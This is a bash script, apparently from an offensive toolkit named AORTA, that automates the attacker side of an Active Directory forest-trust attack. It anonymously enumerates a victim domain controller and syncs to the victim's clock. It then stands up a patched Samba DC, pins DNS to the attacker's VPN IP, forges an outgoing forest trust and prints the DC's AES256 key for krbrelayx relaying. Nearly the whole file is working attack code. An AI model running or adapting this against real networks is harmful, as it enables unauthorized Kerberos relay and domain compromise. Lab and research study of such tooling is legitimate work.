#!/usr/bin/env bash
# =============================================================================
# start-aorta-dc.sh - bring up the complete attacker side of AORTA in one shot.
#
#   ./samba/start-aorta-dc.sh <victim_dc_ip> [overrides]
#
#  1. victim recon    - anonymous LSARPC + RootDSE (victim-enum.py), clock
#                       skew (skewrun), attacker VPN IP; persisted to
#                       discovered.env, container then starts at the victim's
#                       clock via libfaketime. Every value resolves as
#                       CLI flag > probe > cached discovered.env (--help),
#                       so a failing probe only degrades, never aborts.
#  2. wipe            - docker compose down -v (fresh domain SID / DC01$ keys);
#                       runs AFTER recon so a failed recon never destroys a
#                       running stack
#  3. provision       - build + start the patched Samba AD DC container
#  4. configure       - pin all attacker-forest A records to the VPN IP,
#                       local DNS zone for the victim realm (DC-locator SRVs)
#  5. trust           - OUTGOING forest trust via LOCAL LSA only
#                       (trust-create.py opnum 51/74 + trust-secret.py LDB)
#  6. print           - DC01$ AES256 key (krbrelayx) + domain SID (aorta trust add)
#
# Victim-side steps (aorta tool, krbrelayx, coercion) are documented in README.
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")/.."
# shellcheck disable=SC1091
source defaults.env
# Static config lives in defaults.env (NOT .env - it holds no secrets, just
# domain identity + credentials defaults, and the name shouldn't scream
# "secrets"). Auto-discovered victim data is in discovered.env (git-ignored),
# missing on first run; victim_recon() creates it via set_env.
if [ -f discovered.env ]; then
  # shellcheck disable=SC1091
  source discovered.env
fi
# Compose doesn't auto-load anything but a literal .env, so point every
# docker compose call in this script at both files via COMPOSE_ENV_FILES.
# discovered.env is only included once it exists (compose errors on missing
# env files; before the first recon run it isn't needed for `down -v`).
COMPOSE_ENV_FILES="defaults.env"
[ -f discovered.env ] && COMPOSE_ENV_FILES="${COMPOSE_ENV_FILES},discovered.env"
export COMPOSE_ENV_FILES

usage() {
  cat <<'EOF'
usage: ./samba/start-aorta-dc.sh [victim_dc_ip] [overrides]

Bring up the attacker AORTA forest. Everything is auto-detected where
possible (anonymous LSARPC/RootDSE enum, skewrun clock skew, VPN IP from
'ip route get'); each value resolves as:

    CLI flag  >  fresh probe  >  cached discovered.env

A failing probe only degrades: gaps are filled from flags/cache, and only a
still-missing value aborts the run (before anything is wiped), printing the
exact flags to set. Recon happens before the wipe.

Overrides:
  victim_dc_ip          victim DC address (short for --target-dc-ip; falls
                        back to the cached TARGET_DC_IP)
  --target-dc-ip IP     victim DC IP
  --target-realm R      victim DNS domain, e.g. victim.local
  --target-netbios N    victim NetBIOS domain, e.g. VICTIM
  --target-sid S        victim domain SID, S-1-5-21-...
  --target-dc-fqdn F    victim DC FQDN, e.g. dc.victim.local
  --attacker-ip IP      attacker VPN IP (DNS A records + krbrelayx hint)
  --offset '[+-]Ns'     clock offset in skewrun format, e.g. +25199s;
                        'none' disables clock sync entirely
  --skip-recon          do not probe the victim; build purely from flags +
                        cached discovered.env (offline rebuild)

Examples:
  ./samba/start-aorta-dc.sh 10.129.56.33
  ./samba/start-aorta-dc.sh 10.129.56.33 --attacker-ip 10.10.15.140 --offset +25199s
  # null sessions blocked? feed it what your own recon found:
  ./samba/start-aorta-dc.sh --target-dc-ip 10.129.56.33 --target-realm victim.local \
      --target-netbios VICTIM --target-sid S-1-5-21-... --target-dc-fqdn dc.victim.local
  ./samba/start-aorta-dc.sh --skip-recon      # rebuild from discovered.env
EOF
}

# --- helpers -------------------------------------------------------------------
set_env() {  # set_env VAR VALUE - persist auto-discovered value in discovered.env
  # No sed -i on purpose: it renames a temp file over the target and tries to
  # preserve its permissions, which errors on filesystems without chmod
  # support (CIFS/virtiofs/VM shares). A plain redirect rewrites the existing
  # inode instead - permissions and ownership stay untouched.
  local var="$1" val="$2" line out="" found=0
  if [ -f discovered.env ]; then
    while IFS= read -r line; do
      if [[ "$line" == "${var}="* ]]; then
        line="${var}=${val}"; found=1
      fi
      out+="${line}"$'\n'
    done < discovered.env
    [ "$found" -eq 1 ] || out+="${var}=${val}"$'\n'
    printf '%s' "$out" > discovered.env
  else
    printf '%s=%s\n' "$var" "$val" > discovered.env
  fi
}

REALM_LC="${REALM,,}"
ADMIN=(-U "Administrator%${ADMIN_PASS}")

wipe() {
  echo "[*] Wiping previous stack (containers + AD volumes)"
  docker compose down -v
}

# apply VAR FLAG - resolve one auto-discovered variable. Precedence:
# CLI flag > fresh probe result > cached discovered.env value. Appends to
# missing/hints (dynamic scope, owned by recon) if unresolvable.
apply() {
  local var="$1" flag="$2"
  local -n opt="OPT_$var" probe="PROBE_$var" cur="$var"
  if [ -n "${opt:-}" ]; then
    cur="$opt"
    set_env "$var" "$cur"
    echo "[*] ${var} = ${cur} (from ${flag})"
  elif [ -n "${probe:-}" ]; then
    cur="$probe"
    set_env "$var" "$cur"
  elif [ -n "${cur:-}" ]; then
    echo "[!] ${var}: probe failed or skipped, reusing cached '${cur}' (${flag} to override)" >&2
  else
    missing+=("$var")
    hints+=("$flag")
  fi
}

recon() {
  local -a missing=() hints=()
  local out k v

  # set_env appends here; create with header if missing so it is also part
  # of COMPOSE_ENV_FILES on the very FIRST run (FAKETIME interpolation).
  if [ ! -f discovered.env ]; then
    {
      echo "# Auto-discovered by ./samba/start-aorta-dc.sh (victim recon + clock skew + VPN IP)."
      echo "# Git-ignored on purpose - do not edit by hand; regenerated on every run."
    } > discovered.env
    COMPOSE_ENV_FILES="defaults.env,discovered.env"
    export COMPOSE_ENV_FILES
  fi
  if [ -n "${TARGET_DC_IP:-}" ] && [ "$TARGET_DC_IP" != "$VICTIM_IP" ]; then
    echo "[!] cached discovered.env was collected against ${TARGET_DC_IP}, not ${VICTIM_IP} - cached fallbacks may be stale" >&2
  fi

  if [ "$SKIP_RECON" -eq 1 ]; then
    echo "[*] --skip-recon: reusing discovered.env, no probes"
  else
    echo "[*] Anonymous enum of victim ${VICTIM_IP} (LSARPC + RootDSE)"
    # victim-enum prints whatever it could collect (partial results are OK,
    # per-probe failures go to stderr); non-zero only if BOTH probes failed.
    if out="$(python3 samba/victim-enum.py "$VICTIM_IP")"; then
      echo "$out"
      while IFS='=' read -r k v; do
        if [ -n "$v" ]; then printf -v "PROBE_$k" '%s' "$v"; fi
      done <<<"$out"
    else
      echo "[!] victim enum failed - filling gaps from flags / discovered.env" >&2
    fi

    if [ "$OFFSET_SET" -eq 0 ]; then
      echo "[*] Measuring clock skew (skewrun)"
      if PROBE_FAKETIME_OFFSET="$(skewrun --print-offset "$VICTIM_IP" 2>/dev/null)"; then
        echo "[*] offset: ${PROBE_FAKETIME_OFFSET}"
      else
        echo "[!] skewrun failed - falling back to flag / cached offset (--offset '[+-]Ns' to set)" >&2
      fi
    fi
  fi

  # Attacker IP: derived purely locally (never touches the victim), so always
  # resolve it unless flagged: src address of the route to the victim (works
  # for any VPN interface), else first IPv4 of tun0.
  if [ -z "$OPT_ATTACKER_IP" ]; then
    PROBE_ATTACKER_IP="$(ip -4 route get "$VICTIM_IP" 2>/dev/null \
      | awk '{for (i = 1; i <= NF; i++) if ($i == "src") {print $(i + 1); exit}}' || true)"
    if [ -z "$PROBE_ATTACKER_IP" ]; then
      PROBE_ATTACKER_IP="$(ip -4 addr show dev tun0 2>/dev/null \
        | awk '/inet /{sub(/\/.*/, ""); print $2; exit}' || true)"
    fi
  fi

  # clock offset: flag (incl. 'none') > measured > cached > none (warn only)
  if [ "$OFFSET_SET" -eq 1 ]; then
    FAKETIME_OFFSET="$OPT_FAKETIME_OFFSET"
    set_env FAKETIME_OFFSET "$FAKETIME_OFFSET"
    if [ -n "$FAKETIME_OFFSET" ]; then
      echo "[*] offset: ${FAKETIME_OFFSET} (--offset)"
    else
      echo "[*] offset: clock sync disabled (--offset none)"
    fi
  elif [ -n "${PROBE_FAKETIME_OFFSET:-}" ]; then
    FAKETIME_OFFSET="$PROBE_FAKETIME_OFFSET"
    set_env FAKETIME_OFFSET "$FAKETIME_OFFSET"
  elif [ -n "${FAKETIME_OFFSET:-}" ] && [ "$SKIP_RECON" -eq 0 ]; then
    echo "[!] skewrun failed, reusing cached offset ${FAKETIME_OFFSET}" >&2
  elif [ -z "${FAKETIME_OFFSET:-}" ]; then
    echo "[!] no clock offset known - container runs at the host clock;" >&2
    echo "    Kerberos against the victim will fail if it is skewed (--offset '[+-]Ns' to set)" >&2
  fi
  FAKETIME_OFFSET="${FAKETIME_OFFSET:-}"

  apply TARGET_REALM    --target-realm
  apply TARGET_NETBIOS  --target-netbios
  apply TARGET_SID      --target-sid
  apply TARGET_DC_FQDN  --target-dc-fqdn
  apply TARGET_DC_IP    --target-dc-ip
  apply ATTACKER_IP     --attacker-ip

  if [ "${#missing[@]}" -gt 0 ]; then
    echo "[!] could not determine: ${missing[*]}" >&2
    echo "    provide via: ${hints[*]}  - or fix connectivity / anonymous access (see --help)" >&2
    exit 1
  fi
  echo "[*] Attacker VPN ip: ${ATTACKER_IP}"

  # set_env only updates discovered.env; export so this same run (and compose
  # interpolation on the first run) sees the values under set -u.
  export TARGET_REALM TARGET_NETBIOS TARGET_SID TARGET_DC_FQDN TARGET_DC_IP \
    ATTACKER_IP FAKETIME_OFFSET
}

provision() {
  echo "[*] Building + starting samba-dc (first build ~20 min; cached after)"
  docker compose up -d --build
  echo "[*] Waiting for Samba AD DC to answer samba-tool domain info ..."
  local ready=0
  for _ in $(seq 1 60); do
    if docker compose exec -T samba-dc sh -c 'samba-tool domain info 127.0.0.1 >/dev/null 2>&1'; then
      ready=1; break
    fi
    sleep 2
  done
  if [ "$ready" -ne 1 ]; then
    echo "[!] Samba did not become ready. Last log lines:"
    docker compose logs --tail=80 samba-dc
    exit 1
  fi
  echo "[+] Samba AD DC is up (${REALM})"
  docker compose exec -T samba-dc samba-tool domain info 127.0.0.1
}

configure() {
  local dc_host="${NETBIOS_NAME,,}" dc_fqdn node ip
  dc_fqdn="${dc_host}.${REALM_LC}"
  local dns=127.0.0.1   # the DC's own DNS

  # Pin '@' and the DC host A records to the VPN IP only (dnsupdate is
  # disabled via conf.d/10-aorta.conf, so the container IP never comes back).
  echo "[*] DNS: pin '@' and '${dc_host}' A -> ${ATTACKER_IP}"
  for node in @ "${dc_host}"; do
    while read -r ip; do
      [ "$ip" = "$ATTACKER_IP" ] && continue
      echo "    ${node}: delete stale A ${ip}"
      docker compose exec -T samba-dc samba-tool dns delete "$dns" "$REALM_LC" "$node" A "$ip" "${ADMIN[@]}" >/dev/null 2>&1 || true
    done < <(docker compose exec -T samba-dc samba-tool dns query "$dns" "$REALM_LC" "$node" A "${ADMIN[@]}" 2>/dev/null \
             | awk '/^[[:space:]]+A:/ {print $2}' || true)
    docker compose exec -T samba-dc samba-tool dns add "$dns" "$REALM_LC" "$node" A "$ATTACKER_IP" --allow-existing "${ADMIN[@]}" >/dev/null 2>&1 || true
  done
}

target_zone() {
  # Local primary zone for the victim realm (Samba internal DNS has no
  # per-zone forwarder): victim DC A record + DC-locator SRVs.
  local zone="${TARGET_REALM,,}" dc_fqdn="${TARGET_DC_FQDN,,}" node spec port
  local dc_node="${dc_fqdn%.${zone}}"
  [ "$dc_node" != "$dc_fqdn" ] || { echo "[!] TARGET_DC_FQDN not inside TARGET_REALM" >&2; exit 1; }
  local dns=127.0.0.1

  echo "[*] Ensure local DNS zone ${zone}"
  docker compose exec -T samba-dc samba-tool dns zonecreate "$dns" "$zone" "${ADMIN[@]}" >/dev/null 2>&1 || true

  for node in @ "$dc_node"; do
    while read -r ip; do
      [ "$ip" = "${TARGET_DC_IP}" ] && continue
      docker compose exec -T samba-dc samba-tool dns delete "$dns" "$zone" "$node" A "$ip" "${ADMIN[@]}" >/dev/null 2>&1 || true
    done < <(docker compose exec -T samba-dc samba-tool dns query "$dns" "$zone" "$node" A "${ADMIN[@]}" 2>/dev/null \
             | awk '/^[[:space:]]+A:/ {print $2}' || true)
    docker compose exec -T samba-dc samba-tool dns add "$dns" "$zone" "$node" A "${TARGET_DC_IP}" --allow-existing "${ADMIN[@]}" >/dev/null 2>&1 || true
  done

  for spec in "_ldap._tcp 389" "_kerberos._tcp 88" "_ldap._tcp.dc._msdcs 389" "_kerberos._tcp.dc._msdcs 88"; do
    read -r node port <<<"$spec"
    docker compose exec -T samba-dc samba-tool dns add "$dns" "$zone" "$node" SRV \
      "${dc_fqdn} ${port} 0 100" --allow-existing "${ADMIN[@]}" >/dev/null 2>&1 || true
  done
}

create_trust() {
  echo "[*] Creating OUTGOING forest trust -> ${TARGET_REALM} (${TARGET_NETBIOS}, ${TARGET_SID}) attrs=0x808"
  # Pure-local LsarCreateTrustedDomainEx: authenticates only to our own DC,
  # never contacts the victim forest, needs no victim credentials.
  python3 samba/trust-create.py create \
    --dc 127.0.0.1 --user Administrator --password "$ADMIN_PASS" --domain "$REALM" \
    --peer-domain "$TARGET_REALM" --peer-netbios "$TARGET_NETBIOS" \
    --peer-sid "$TARGET_SID" --trust-password "$TRUST_SECRET" --attributes 2056

  # Samba's opnum 51 drops the auth info ("do not create secrets for now",
  # source4/rpc_server/lsa/dcesrv_lsa.c) - store trustAuthOutgoing via LDB or
  # the KDC has no trust keys (referrals fail with KRB_AP_ERR_NOT_US).
  echo "[*] Storing trustAuthOutgoing (LDB)"
  docker compose exec -T samba-dc python3 - "$TARGET_REALM" "$TRUST_SECRET" < samba/trust-secret.py
}

print_ready() {
  local dom_dn="DC=${REALM_LC//./,DC=}" sid key
  sid="$(docker compose exec -T samba-dc ldbsearch -H /var/lib/samba/private/sam.ldb \
    -s base -b "$dom_dn" objectSid 2>/dev/null | awk '/^objectSID:|^objectSid:/{print $2; exit}')"
  [ -n "$sid" ] || { echo "[!] could not read domain SID from sam.ldb" >&2; exit 1; }

  docker compose exec -T samba-dc samba-tool domain exportkeytab /tmp/dc.keytab --principal="${NETBIOS_NAME}\$" >/dev/null
  docker compose cp samba-dc:/tmp/dc.keytab ./dc01.keytab >/dev/null
  chmod 600 dc01.keytab
  key="$(python3 - <<'PY'
from impacket.krb5.keytab import Keytab
for e in Keytab.loadFile("dc01.keytab").entries:
    kb = e.main_part["keyblock"]
    if "aes256" in kb.prettyKeytype().lower():
        print(kb.hexlifiedValue().decode()); break
PY
)"
  [ -n "$key" ] || { echo "[!] no AES256 key in keytab" >&2; exit 1; }

  cat <<EOF

==================== attacker side ready ====================
  attacker         : ${REALM} (DC ${DC_FQDN}) @ ${ATTACKER_IP}
  victim           : ${TARGET_REALM} @ ${TARGET_DC_IP} (SID ${TARGET_SID})
  clock offset     : ${FAKETIME_OFFSET:-none}

  domain SID       : ${sid}
      -> 'aorta trust add ... --attacker-sid ${sid}'

  DC01\$ AES256 key : ${key}
      -> krbrelayx.py -aesKey ${key} -ip ${ATTACKER_IP}
  validate trust   : ./samba/validate-trust.sh   (= nltest /sc_verify)
==============================================================
EOF
}

# --- main -----------------------------------------------------------------------
# Auto-detection stays the default; every discovered value has a matching
# override flag (precedence: flag > probe > cached discovered.env, --help).
OPT_TARGET_DC_IP="" OPT_TARGET_REALM="" OPT_TARGET_NETBIOS=""
OPT_TARGET_SID="" OPT_TARGET_DC_FQDN="" OPT_ATTACKER_IP="" OPT_FAKETIME_OFFSET=""
OFFSET_SET=0 SKIP_RECON=0
pos=()
while [ $# -gt 0 ]; do
  case "$1" in
    --target-dc-ip|--target-realm|--target-netbios|--target-sid|--target-dc-fqdn|--attacker-ip|--offset)
      [ $# -ge 2 ] || { echo "[!] $1 requires a value" >&2; exit 1; }
      case "$1" in
        --target-dc-ip)    OPT_TARGET_DC_IP="$2";;
        --target-realm)    OPT_TARGET_REALM="$2";;
        --target-netbios)  OPT_TARGET_NETBIOS="$2";;
        --target-sid)      OPT_TARGET_SID="$2";;
        --target-dc-fqdn)  OPT_TARGET_DC_FQDN="$2";;
        --attacker-ip)     OPT_ATTACKER_IP="$2";;
        --offset)          OPT_FAKETIME_OFFSET="$2" OFFSET_SET=1;;
      esac
      shift 2;;
    --skip-recon) SKIP_RECON=1
                  shift;;
    -h|--help)    usage; exit 0;;
    -*)           echo "[!] unknown option: $1" >&2; usage >&2; exit 1;;
    *)            pos+=("$1")
                  shift;;
  esac
done
[ "${#pos[@]}" -le 1 ] || { echo "[!] too many positional arguments" >&2; usage >&2; exit 1; }
[ "$OPT_FAKETIME_OFFSET" != "none" ] || OPT_FAKETIME_OFFSET=""   # --offset none
# victim IP: flag > positional > cached discovered.env
VICTIM_IP="${OPT_TARGET_DC_IP:-${pos[0]:-${TARGET_DC_IP:-}}}"
[ -n "$VICTIM_IP" ] || { usage >&2; exit 1; }

recon      # runs before wipe: a failed recon must not destroy a running stack
wipe
provision
configure
target_zone
create_trust
print_ready
